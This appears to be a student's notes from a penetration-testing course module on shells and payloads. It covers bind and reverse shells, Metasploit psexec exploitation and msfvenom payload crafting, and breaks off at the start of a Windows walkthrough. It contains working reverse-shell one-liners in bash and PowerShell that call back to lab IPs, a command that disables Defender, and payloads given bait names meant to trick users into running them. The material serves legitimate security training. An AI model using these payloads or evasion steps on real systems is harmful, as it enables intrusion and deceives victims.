## Shells Jack Us In, Payloads Deliver Us Shells : 

A `shell` is a program that provides a computer user with an interface to input instructions into the system and view text output (Bash, Zsh, cmd, and PowerShell, for example).

Remember that the shell gives us direct access to the `OS`, `system commands`, and `file system`. So if we gain access, we can start enumerating the system for vectors that may allow us to escalate privileges, pivot, transfer files, and more.

Establishing a shell also allows us to maintain persistence on the system, giving us more time to work. It can make it easier to use our `attack tools`, `exfiltrate data`, `gather`, `store` and `document` all the details of our attack, as we will soon see in the proceeding demonstrations.

Within the IT industry as a whole, a `payload` can be defined in a few different ways :

- `Networking`: The encapsulated data portion of a packet traversing modern computer networks.
- `Basic Computing`: A payload is the portion of an instruction set that defines the action to be taken. Headers and protocol information removed.
- `Programming`: The data portion referenced or carried by the programming language instruction.
- `Exploitation & Security`: A payload is `code` crafted with the intent to exploit a vulnerability on a computer system. The term payload can describe various types of malware, including but not limited to ransomware.

## Anatomy of a Shell : 

Every operating system has a shell, and to interact with it, we must use an application known as a `terminal emulator`. Here are some of the most common terminal emulators :

![[terminal_emulator.png]]

Let's use our `Parrot OS` Pwnbox to further explore the anatomy of a shell. open the `MATE` terminal emulator.

In this instance, we are "clued" to what language interpreter is in use by seeing the `$` sign. This $ sign is used in Bash, Ksh, POSIX, and many other shell languages to mark the start of the `shell prompt` where the user can begin typing commands and other input

Another way we can identify the language interpreter is by viewing the processes running on the machine. In Linux, we can do this using the following command :

```shell
NolanCarougeHTB@htb[/htb]$ ps
```

We can also find out what shell language is in use by viewing the environment variables using the `env` command :

```shell
NolanCarougeHTB@htb[/htb]$ env
```

Now let's select the blue square icon at the top of the screen in Pwnbox. Selecting this icon also opens the MATE terminal application but uses a different command language interpreter this time around.

## Bind Shells : 

In many cases, we will be working to establish a shell on a system on a local or remote network. This means we will be looking to use the terminal emulator application on our local attack box to control the remote system through its shell. This is typically done by using a `Bind` &/or `Reverse` shell.

With a bind shell, the `target` system has a listener started and awaits a connection from a pentester's system (attack box).

![[bindshell.webp]]

As seen in the image, we would connect directly with the `IP address` and `port` listening on the target. There can be many challenges associated with getting a shell this way. Here are some to consider :

- There would have to be a listener already started on the target.
- If there is no listener started, we would need to find a way to make this happen.
- Admins typically configure strict incoming firewall rules and NAT (with PAT implementation) on the edge of the network (public-facing), so we would need to be on the internal network already.
- Operating system firewalls (on Windows & Linux) will likely block most incoming connections that aren't associated with trusted network-based applications.

First, we need to spawn our attack box or Pwnbox and connect to the Academy network environment. To do this, we will be using `netcat` (`nc`) on the client and server.

```shell
Target@server:~$ nc -lvnp 7777
```

Back on the client (attack box), we will use nc to connect to the listener we started on the server.

```shell
NolanCarougeHTB@htb[/htb]$ nc -nv 10.129.41.200 7777
```

On the server-side, we will need to specify the `directory`, `shell`, `listener`, work with some `pipelines`, and `input` & `output` `redirection` to ensure a shell to the system gets served when the client attempts to connect.

```shell
Target@server:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```

The commands above are considered our payload, and we delivered this payload manually. Back on the client, use Netcat to connect to the server now that a shell on the server is being served.

```shell
NolanCarougeHTB@htb[/htb]$ nc -nv 10.129.41.200 7777
```

As mentioned earlier in this section, it is also good to remember that the bind shell is much easier to defend against. Since the connection will be received incoming, it is more likely to get detected and blocked by firewalls even if standard ports are used when starting a listener. There are ways to get around this by using a reverse shell which we will discuss in the next section.

## Reverse Shells : 

With a `reverse shell`, the attack box will have a listener running, and the target will need to initiate the connection.

![[reverseshell.webp]]

We will often use this kind of shell as we come across vulnerable systems because it is likely that an admin will overlook outbound connections, giving us a better chance of going undetected.

As seen in the image above, we are starting a listener for a reverse shell on our attack box and using some method (example: `Unrestricted File Upload`, `Command Injection`, etc..) to force the target to initiate a connection with our target box, effectively meaning our attack box becomes the server and the target becomes the client.

There are helpful tools that infosec veterans have put together to assist us. [Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) is one fantastic resource that contains a list of different commands, code, and even automated reverse shell generators we can use when practicing or on an actual engagement.

We can start a Netcat listener on our attack box as the target spawns.

```shell
NolanCarougeHTB@htb[/htb]$ sudo nc -lvnp 443
```

This time around with our listener, we are binding it to a [common port](https://web.mit.edu/rhel-doc/4/RH-DOCS/rhel-sg-en-4/ch-ports.html) (`443`), this port usually is for `HTTPS` connections. We may want to use common ports like this because when we initiate the connection to our listener, we want to ensure it does not get blocked going outbound through the OS firewall and at the network level.

On the Windows target, open a command prompt and copy & paste this command :

```cmd
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.16.33',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

`What happened when we hit enter in command prompt?`

The `Windows Defender antivirus` (`AV`) software stopped the execution of the code. This is working exactly as intended, and from a `defensive` perspective, this is a `win`

For our purposes, we will want to disable the antivirus through the `Virus & threat protection settings` or by using this command in an administrative PowerShell console (right-click, run as admin) :

```powershell
PS C:\Users\htb-student> Set-MpPreference -DisableRealtimeMonitoring $true
```

## Introduction to Payloads : 

Keep in mind that when we deliver and execute payloads, just like any other program, we give the target computer instructions on what it needs to do. The terms "malware" and "malicious code" romanticize the process and make it more mysterious than it is.

We will start this process by breaking down the one-liners we worked with earlier :

```shell
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
```

Let's break down each portion of the one-liner :

- Removes the `/tmp/f` file if it exists, `-f` causes `rm` to ignore nonexistent files. The semi-colon (`;`) is used to execute the command sequentially.
- Makes a [FIFO named pipe file](https://man7.org/linux/man-pages/man7/fifo.7.html) at the location specified. In this case, /tmp/f is the FIFO named pipe file, the semi-colon (`;`) is used to execute the command sequentially.
- Concatenates the FIFO named pipe file /tmp/f, the pipe (`|`) connects the standard output of cat /tmp/f to the standard input of the command that comes after the pipe (`|`).
- Specifies the command language interpreter using the `-i` option to ensure the shell is interactive. `2>&1` ensures the standard error data stream (`2`) `&` standard output data stream (`1`) are redirected to the command following the pipe (`|`).
- Uses Netcat to send a connection to our attack host `10.10.14.12` listening on port `7777`. The output will be redirected (`>`) to /tmp/f, serving the Bash shell to our waiting Netcat listener when the reverse shell one-liner command is executed.

The shells & payloads we choose to use largely depend on which OS we are attacking. We witnessed this in the reverse shells section by establishing a reverse shell with a Windows system using PowerShell. Let's breakdown the one-liner we used :

```cmd-
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

- Executes `powershell.exe` with no profile (`nop`) and executes the command/script block (`-c`) contained in the quotes.
- Sets/evaluates the variable `$client` equal to (`=`) the `New-Object` cmdlet, which creates an instance of the `System.Net.Sockets.TCPClient` .NET framework object. The .NET framework object will connect with the TCP socket listed in the parentheses `(10.10.14.158,443)`.
- Sets/evaluates the variable `$stream` equal to (`=`) the `$client` variable and the .NET framework method called [GetStream](https://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.tcpclient.getstream?view=net-5.0) that facilitates network communications.
- Creates a byte type array (`[]`) called `$bytes` that returns 65,535 zeros as the values in the array. This is essentially an empty byte stream that will be directed to the TCP listener on an attack box awaiting a connection.
- Starts a `while` loop containing the `$i` variable set equal to (`=`) the .NET framework [Stream.Read](https://docs.microsoft.com/en-us/dotnet/api/system.io.stream.read?view=net-5.0) (`$stream.Read`) method. The parameters: buffer (`$bytes`), offset (`0`), and count (`$bytes.Length`) are defined inside the parentheses of the method.
- Sets/evaluates the variable `$data` equal to (`=`) an [ASCII](https://en.wikipedia.org/wiki/ASCII) encoding .NET framework class that will be used in conjunction with the `GetString` method to encode the byte stream (`$bytes`) into ASCII.
- Sets/evaluates the variable `$sendback` equal to (`=`) the Invoke-Expression (`iex`) cmdlet against the `$data` variable, then redirects the standard error (`2>`) `&` standard output (`1`) through a pipe (`|`) to the `Out-String` cmdlet which converts input objects into strings.
- Sets/evaluates the variable `$sendback2` equal to (`=`) the `$sendback` variable plus (`+`) the string PS (`'PS'`) plus `+` path to the working directory (`(pwd).path`) plus (`+`) the string `'> '`. This will result in the shell prompt being PS C:\workingdirectoryofmachine >.
- Sets/evaluates the variable `$sendbyte` equal to (`=`) the ASCII encoded byte stream that will use a TCP client to initiate a PowerShell session with a Netcat listener running on the attack box.
- This is the [TcpClient.Close](https://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.tcpclient.close?view=net-5.0) method that will be used when the connection is terminated.

The one-liner we just examined together can also be executed in the form of a PowerShell script (`.ps1`). We can see an example of this by viewing the source code below. This source code is part of the [nishang](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) project.

Understanding what different types of payloads are doing can help us understand why AV is blocking us from execution and give us some idea of what we might need to change in our code to bypass restrictions.

## Automating Payloads & Delivery with Metasploit :

[Metasploit](https://www.metasploit.com) is an automated attack framework developed by `Rapid7` that streamlines the process of exploiting vulnerabilities through the use of pre-built modules that contain easy-to-use options to exploit vulnerabilities and deliver payloads to gain a shell on a vulnerable system.

Let's start working hands-on with Metasploit by launching the Metasploit framework console as root (`sudo msfconsole`).

```shell
NolanCarougeHTB@htb[/htb]$ sudo msfconsole 
                                                  
IIIIII    dTb.dTb        _.---._
  II     4'  v  'B   .'"".'/|\`.""'.
  II     6.     .P  :  .' / | \ `.  :
  II     'T;. .;P'  '.'  /  |  \  `.'
  II      'T; ;P'    `. /   |   \ .'
IIIIII     'YvP'       `-.__|__.-'

I love shells --egypt


       =[ metasploit v6.0.44-dev                          ]
+ -- --=[ 2131 exploits - 1139 auxiliary - 363 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 8 evasion                                       ]

Metasploit tip: Writing a custom module? After editing your 
module, why not try the reload command

msf6 > 
```
 
Remember that Metasploit can be used for more than just exploitation. We can also use different modules to scan & enumerate targets. In this case, we will be using enumeration results from a `nmap` scan to pick a Metasploit module to use.

```shell
NolanCarougeHTB@htb[/htb]$ nmap -sC -sV -Pn 10.129.164.25

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-09 21:03 UTC
Nmap scan report for 10.129.164.25
Host is up (0.020s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
Host script results:
|_nbstat: NetBIOS name: nil, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:04:e2 (VMware)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-09T21:03:31
|_  start_date: N/A
```

Let's go with `SMB` (listening on `445`) as the potential attack vector.

Once we have this information, we can use Metasploit's search functionality to discover modules that are associated with SMB. In the `msfconsole`, we can issue the command `search smb` to get a list of modules associated with SMB vulnerabilities :

```shell
msf6 > search smb

Matching Modules
================

#    Name                                                          Disclosure Date    Rank   Check  Description
  -       ----                                                     ---------------    ----   -----  ---------- 
 41   auxiliary/scanner/smb/smb_ms17_010                                               normal     No     MS17-010 SMB RCE Detection
 42   auxiliary/dos/windows/smb/ms05_047_pnp                                           normal     No     Microsoft Plug and Play Service Registry Overflow
 43   auxiliary/dos/windows/smb/rras_vls_null_deref                   2006-06-14       normal     No     Microsoft RRAS InterfaceAdjustVLSPointers NULL Dereference
 44   auxiliary/admin/mssql/mssql_ntlm_stealer                                         normal     No     Microsoft SQL Server NTLM Stealer
 45   auxiliary/admin/mssql/mssql_ntlm_stealer_sqli                                    normal     No     Microsoft SQL Server SQLi NTLM Stealer
 46   auxiliary/admin/mssql/mssql_enum_domain_accounts_sqli                            normal     No     Microsoft SQL Server SQLi SUSER_SNAME Windows Domain Account Enumeration
 47   auxiliary/admin/mssql/mssql_enum_domain_accounts                                 normal     No     Microsoft SQL Server SUSER_SNAME Windows Domain Account Enumeration
 48   auxiliary/dos/windows/smb/ms06_035_mailslot                     2006-07-11       normal     No     Microsoft SRV.SYS Mailslot Write Corruption
 49   auxiliary/dos/windows/smb/ms06_063_trans                                         normal     No     Microsoft SRV.SYS Pipe Transaction No Null
 50   auxiliary/dos/windows/smb/ms09_001_write                                         normal     No     Microsoft SRV.SYS WriteAndX Invalid DataOffset
 51   auxiliary/dos/windows/smb/ms09_050_smb2_negotiate_pidhigh                        normal     No     Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference
 52   auxiliary/dos/windows/smb/ms09_050_smb2_session_logoff                           normal     No     Microsoft SRV2.SYS SMB2 Logoff Remote Kernel NULL Pointer Dereference
 53   auxiliary/dos/windows/smb/vista_negotiate_stop                                   normal     No     Microsoft Vista SP0 SMB Negotiate Protocol DoS
 54   auxiliary/dos/windows/smb/ms10_006_negotiate_response_loop                       normal     No     Microsoft Windows 7 / Server 2008 R2 SMB Client Infinite Loop
 55   auxiliary/scanner/smb/psexec_loggedin_users                                      normal     No     Microsoft Windows Authenticated Logged In Users Enumeration
 56   exploit/windows/smb/psexec                                      1999-01-01       manual     No     Microsoft Windows Authenticated User Code Execution
 57   auxiliary/dos/windows/smb/ms11_019_electbowser                                   normal     No     Microsoft Windows Browser Pool DoS
 58   exploit/windows/smb/smb_rras_erraticgopher                      2017-06-13       average    Yes    Microsoft Windows RRAS Service MIBEntryGet Overflow
 59   auxiliary/dos/windows/smb/ms10_054_queryfs_pool_overflow                         normal     No     Microsoft Windows SRV.SYS SrvSmbQueryFsInformation Pool Overflow DoS
 60   exploit/windows/smb/ms10_046_shortcut_icon_dllloader            2010-07-16       excellent  No     Microsoft Windows Shell LNK Code Execution
```

We will see a long list of `Matching Modules` associated with our search. Notice the format each module is in. Each module has a number listed on the far left of the table to make selecting the module easier, a `Name`, `Disclosure Date`, `Rank`, `Check` and `Description`.

Let's look at one module, in particular, to understand it within the context of payloads.

`56 exploit/windows/smb/psexec`

![[exploit_56.png]]

```shell
msf6 > use 56

[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

msf6 exploit(windows/smb/psexec) > 
```

Let's learn more about using this exploit and delivering the payload by using the `options` command.

```shell
msf6 exploit(windows/smb/psexec) > options

Module options (exploit/windows/smb/psexec):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   RHOSTS                                 yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                 445              yes       The SMB service port (TCP)
   SERVICE_DESCRIPTION                    no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                   no        The service display name
   SERVICE_NAME                           no        The service name
   SHARE                                  no        The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write fo
                                                    lder share
   SMBDomain             .                no        The Windows domain to use for authentication
   SMBPass                                no        The password for the specified username
   SMBUser                                no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     68.183.42.102    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

We will want to use the `set` command to configure the following settings as such :

```shell
msf6 exploit(windows/smb/psexec) > set RHOSTS 10.129.180.71
RHOSTS => 10.129.180.71
msf6 exploit(windows/smb/psexec) > set SHARE ADMIN$
SHARE => ADMIN$
msf6 exploit(windows/smb/psexec) > set SMBPass HTB_@cademy_stdnt!
SMBPass => HTB_@cademy_stdnt!
msf6 exploit(windows/smb/psexec) > set SMBUser htb-student
SMBUser => htb-student
msf6 exploit(windows/smb/psexec) > set LHOST 10.10.14.222
LHOST => 10.10.14.222
```

```shell
msf6 exploit(windows/smb/psexec) > exploit

[*] Started reverse TCP handler on 10.10.14.222:4444 
[*] 10.129.180.71:445 - Connecting to the server...
[*] 10.129.180.71:445 - Authenticating to 10.129.180.71:445 as user 'htb-student'...
[*] 10.129.180.71:445 - Selecting PowerShell target
[*] 10.129.180.71:445 - Executing the payload...
[+] 10.129.180.71:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175174 bytes) to 10.129.180.71
[*] Meterpreter session 1 opened (10.10.14.222:4444 -> 10.129.180.71:49675) at 2021-09-13 17:43:41 +0000

meterpreter > 
```

Like other command language interpreters (Bash, PowerShell, ksh, etc...), Meterpreter shell sessions allow us to issue a set of commands we can use to interact with the target system. We can use the `?` to see a list of commands we can use. We will notice limitations with the Meterpreter shell, so it is good to attempt to use the `shell` command to drop into a system-level shell if we need to work with the complete set of system commands native to our target.

## Crafting Payloads with MSFvenom :

We must be mindful that using automated attacks in Metasploit requires us to reach a vulnerable target machine over the network. Consider what we did in the last section. To `run the exploit module`, `deliver the payload`, and `establish the shell session`, we needed to communicate with the system in the first place.

In addition to providing a payload with flexible delivery options, MSFvenom also allows us to `encrypt` & `encode` payloads to bypass common anti-virus detection signatures. Let's practice a bit with these concepts.

In Pwnbox or any host with MSFvenom installed, we can issue the command `msfvenom -l payloads` to list all the available payloads.

```shell
NolanCarougeHTB@htb[/htb]$ msfvenom -l payloads

Framework Payloads (592 total) [--payload <value>]
==================================================

    Name                                                Description
    ----                                                -----------
linux/x86/shell/reverse_nonx_tcp                    Spawn a command shell (staged). Connect back to the attacker
linux/x86/shell/reverse_tcp                         Spawn a command shell (staged). Connect back to the attacker
linux/x86/shell/reverse_tcp_uuid                    Spawn a command shell (staged). Connect back to the attacker
linux/x86/shell_bind_ipv6_tcp                       Listen for a connection over IPv6 and spawn a command shell
linux/x86/shell_bind_tcp                            Listen for a connection and spawn a command shell
linux/x86/shell_bind_tcp_random_port                Listen for a connection in a random port and spawn a command shell. Use nmap to discover the open port: 'nmap -sS target -p-'.
linux/x86/shell_find_port                           Spawn a shell on an established connection
linux/x86/shell_find_tag                            Spawn a shell on an established connection (proxy/nat safe)
linux/x86/shell_reverse_tcp                         Connect back to attacker and spawn a command shell
linux/x86/shell_reverse_tcp_ipv6                    Connect back to attacker and spawn a command shell over IPv6
linux/zarch/meterpreter_reverse_http                Run the Meterpreter / Mettle server payload (stageless)
linux/zarch/meterpreter_reverse_https               Run the Meterpreter / Mettle server payload (stageless)
linux/zarch/meterpreter_reverse_tcp                 Run the Meterpreter / Mettle server payload (stageless)
mainframe/shell_reverse_tcp                         Listen for a connection and spawn a  command shell. This implementation does not include ebcdic character translation, so a client wi
                                                        th translation capabilities is required. MSF handles this automatically.
multi/meterpreter/reverse_http                      Handle Meterpreter sessions regardless of the target arch/platform. Tunnel communication over HTTP
multi/meterpreter/reverse_https                     Handle Meterpreter sessions regardless of the target arch/platform. Tunnel communication over HTTPS
netware/shell/reverse_tcp                           Connect to the NetWare console (staged). Connect back to the attacker
nodejs/shell_bind_tcp                               Creates an interactive shell via nodejs
nodejs/shell_reverse_tcp                            Creates an interactive shell via nodejs
nodejs/shell_reverse_tcp_ssl                        Creates an interactive shell via nodejs, uses SSL
osx/armle/execute/bind_tcp                          Spawn a command shell (staged). Listen for a connection
osx/armle/execute/reverse_tcp                       Spawn a command shell (staged). Connect back to the attacker
osx/armle/shell/bind_tcp                            Spawn a command shell (staged). Listen for a connection
osx/armle/shell/reverse_tcp                         Spawn a command shell (staged). Connect back to the attacker
osx/armle/shell_bind_tcp                            Listen for a connection and spawn a command shell
osx/armle/shell_reverse_tcp                         Connect back to attacker and spawn a command shell
osx/armle/vibrate                                   Causes the iPhone to vibrate, only works when the AudioToolkit library has been loaded. Based on work by Charlie Miller
library has been loaded. Based on work by Charlie Miller

windows/dllinject/bind_hidden_tcp                   Inject a DLL via a reflective loader. Listen for a connection from a hidden port and spawn a command shell to the allowed host.
windows/dllinject/bind_ipv6_tcp                     Inject a DLL via a reflective loader. Listen for an IPv6 connection (Windows x86)
windows/dllinject/bind_ipv6_tcp_uuid                Inject a DLL via a reflective loader. Listen for an IPv6 connection with UUID Support (Windows x86)
windows/dllinject/bind_named_pipe                   Inject a DLL via a reflective loader. Listen for a pipe connection (Windows x86)
windows/dllinject/bind_nonx_tcp                     Inject a DLL via a reflective loader. Listen for a connection (No NX)
windows/dllinject/bind_tcp                          Inject a DLL via a reflective loader. Listen for a connection (Windows x86)
windows/dllinject/bind_tcp_rc4                      Inject a DLL via a reflective loader. Listen for a connection
windows/dllinject/bind_tcp_uuid                     Inject a DLL via a reflective loader. Listen for a connection with UUID Support (Windows x86)
windows/dllinject/find_tag                          Inject a DLL via a reflective loader. Use an established connection
windows/dllinject/reverse_hop_http                  Inject a DLL via a reflective loader. Tunnel communication over an HTTP or HTTPS hop point. Note that you must first upload data/hop
                                                        /hop.php to the PHP server you wish to use as a hop.
windows/dllinject/reverse_http                      Inject a DLL via a reflective loader. Tunnel communication over HTTP (Windows wininet)
windows/dllinject/reverse_http_proxy_pstore         Inject a DLL via a reflective loader. Tunnel communication over HTTP
windows/dllinject/reverse_ipv6_tcp                  Inject a DLL via a reflective loader. Connect back to the attacker over IPv6
windows/dllinject/reverse_nonx_tcp                  Inject a DLL via a reflective loader. Connect back to the attacker (No NX)
windows/dllinject/reverse_ord_tcp                   Inject a DLL via a reflective loader. Connect back to the attacker
windows/dllinject/reverse_tcp                       Inject a DLL via a reflective loader. Connect back to the attacker
windows/dllinject/reverse_tcp_allports              Inject a DLL via a reflective loader. Try to connect back to the attacker, on all possible ports (1-65535, slowly)
windows/dllinject/reverse_tcp_dns                   Inject a DLL via a reflective loader. Connect back to the attacker
windows/dllinject/reverse_tcp_rc4                   Inject a DLL via a reflective loader. Connect back to the attacker
windows/dllinject/reverse_tcp_rc4_dns               Inject a DLL via a reflective loader. Connect back to the attacker
windows/dllinject/reverse_tcp_uuid                  Inject a DLL via a reflective loader. Connect back to the attacker with UUID Support
windows/dllinject/reverse_winhttp                   Inject a DLL via a reflective loader. Tunnel communication over HTTP (Windows winhttp)
```

We can see that some payloads are described as (`staged`) or (`stageless`). Let's cover the difference.

`Staged` payloads create a way for us to send over more components of our attack. We can think of it like we are "setting the stage" for something even more useful. When run using an exploit module in Metasploit, this payload will send a small `stage` that will be executed on the target and then call back to the `attack box` to download the remainder of the payload over the network, then executes the shellcode to establish a reverse shell.

`Stageless` payloads do not have a stage. Using an exploit module in Metasploit, this payload will be sent in its entirety across a network connection without a stage. This could benefit us in environments where we do not have access to much bandwidth and latency can interfere.

Now let's build a simple stageless payload with msfvenom and break down the command.

```shell
NolanCarougeHTB@htb[/htb]$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf

[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
```

- Defines the tool used to make the payload.
- This `option` indicates that msfvenom is creating a payload.
- Specifies a `Linux` `64-bit` stageless payload that will initiate a TCP-based reverse shell (`shell_reverse_tcp`).
- When executed, the payload will call back to the specified IP address (`10.10.14.113`) on the specified port (`443`).
- The `-f` flag specifies the format the generated binary will be in. In this case, it will be an [.elf file](https://en.wikipedia.org/wiki/Executable_and_Linkable_Format).
- Creates the .elf binary and names the file createbackup. We can name this file whatever we want. Ideally, we would call it something inconspicuous and/or something someone would be tempted to download and execute.

At this point, we have the payload created on our attack box. We would now need to develop a way to get that payload onto the target system. There are countless ways this can be done. Here are just some of the common ways :

- Email message with the file attached.
- Download link on a website.
- Combined with a Metasploit exploit module (this would likely require us to already be on the internal network).
- Via flash drive as part of an onsite penetration test.

We would have a listener ready to catch the connection on the attack box side upon successful execution.

```shell
NolanCarougeHTB@htb[/htb]$ sudo nc -lvnp 443

Listening on 0.0.0.0 443
Connection received on 10.129.138.85 60892
env
PWD=/home/htb-student/Downloads
cd ..
ls
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
Videos
```

We can also use msfvenom to craft an executable (`.exe`) file that can be run on a Windows system to provide a shell.

```shell
NolanCarougeHTB@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```

If the AV was disabled all the user would need to do is double click on the file to execute and we would have a shell session.

```shell
NolanCarougeHTB@htb[/htb]$ sudo nc -lvnp 443

Listening on 0.0.0.0 443
Connection received on 10.129.144.5 49679
Microsoft Windows [Version 10.0.18362.1256]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Users\htb-student\Downloads>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is DD25-26EB

 Directory of C:\Users\htb-student\Downloads

09/23/2021  10:26 AM    <DIR>          .
09/23/2021  10:26 AM    <DIR>          ..
09/23/2021  10:26 AM            73,802 BonusCompensationPlanpdf.exe
               1 File(s)         73,802 bytes
               2 Dir(s)   9,997,516,800 bytes free
```

## Infiltrating Windows : 

Over the last few years, several vulnerabilities in the Windows operating system and their corresponding attacks are some of the most exploited vulnerabilities of our time. Let's discuss those for a minute :

![[windows_attack.png]]

This module assumes you have already performed your host enumeration phase and understand what services are commonly seen on hosts. 

Since we have a set of targets, `what are a few ways to determine if the host is likely a Windows Machine`? To answer this question, we can look at a few things. 

The first one being the `Time To Live` (TTL) counter when utilizing ICMP to determine if the host is up. A typical response from a Windows host will either be 32 or 128.

Another way we can validate if the host is Windows or not is to use our handy tool, `NMAP`. Nmap has a cool capability built in to help with OS identification and many other scripted scans to check for anything from a specific vulnerability to information gathered from SNMP. For this example, we will utilize the `-O` option with verbose output `-v` to initialize an OS Identification scan. If you run into issues and the scans turn up little results, attempt again with the `-A` and `-Pn` options.

Now that we know we are dealing with a Windows 10 host, we need to enumerate the services we can see to determine if we have a potential avenue of exploitation. Netcat, Nmap, and many others can perform the enumeration we need, but for this instance, we will look at a simple Nmap script called `banner.nse`.

```shell
NolanCarougeHTB@htb[/htb]$ sudo nmap -v 192.168.86.39 --script banner.nse
```

When it comes to creating payloads for Windows hosts, we have plenty of options to choose from. DLLs, batch files, MSI packages, and even PowerShell scripts are some of the most common methods to use.

- [DLLs](https://docs.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library) A Dynamic Linking Library (DLL) is a library file used in Microsoft operating systems to provide shared code and data that can be used by many different programs at once. As a pentester, injecting a malicious DLL or hijacking a vulnerable library on the host can elevate our privileges to SYSTEM and/or bypass User Account Controls.
- [Batch](https://commandwindows.com/batch.htm) Batch files are text-based DOS scripts utilized by system administrators to complete multiple tasks through the command-line interpreter. We can use batch files to run commands on the host in an automated fashion. 
- [VBS](https://www.guru99.com/introduction-to-vbscript.html) VBScript is a lightweight scripting language based on Microsoft's Visual Basic. It is typically used as a client-side scripting language in webservers to enable dynamic web pages. 
- [MSI](https://docs.microsoft.com/en-us/windows/win32/msi/windows-installer-file-extensions) `.MSI` files serve as an installation database for the Windows Installer. We can use the Windows Installer by crafting a payload as an .msi file. 
- [Powershell](https://docs.microsoft.com/en-us/powershell/scripting/overview?view=powershell-7.1) Powershell is both a shell environment and scripting language. As a scripting language, it is a dynamic language based on the .NET Common Language Runtime that, like its shell component, takes input and output as .NET objects. 

We have plenty of good options for dealing with generating payloads to use against Windows hosts. The table below lays out some of our options. However, this is not an exhaustive list, and new resources come out daily.

![[ressource.png]]

Besides the vectors of web-drive-by, phishing emails, or dead drops, Windows hosts can provide us with several other avenues of payload delivery. The list below includes some helpful tools and protocols for use while attempting to drop a payload on a target.

- `Impacket`: [Impacket](https://github.com/SecureAuthCorp/impacket) is a toolset built-in Python that provides us a way to interact with network protocols directly. Some of the most exciting tools we care about in Impacket deal with `psexec`, `smbclient`, `wmi`, Kerberos, and the ability to stand up an SMB server.
- [Payloads All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute.md): is a great resource to find quick oneliners to help transfer files across hosts expediently.
- `SMB`: SMB can provide an easy to exploit route to transfer files between hosts. This can be especially useful when the victim hosts are domain joined and utilize shares to host data. 
- `Remote execution via MSF`: Built into many of the exploit modules in Metasploit is a function that will build, stage, and execute the payloads automatically.
- `Other Protocols`: When looking at a host, protocols such as FTP, TFTP, HTTP/S, and more can provide you with a way to upload files to the host. 

### Example Compromise Walkthrough : 

1. Enumerate The Host : Ping, Netcat, Nmap scans, and even Metasploit are all good options to start enumerating our potential victims.

```shell
NolanCarougeHTB@htb[/htb]$ nmap -v -A 10.129.201.97

Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-27 18:13 EDT
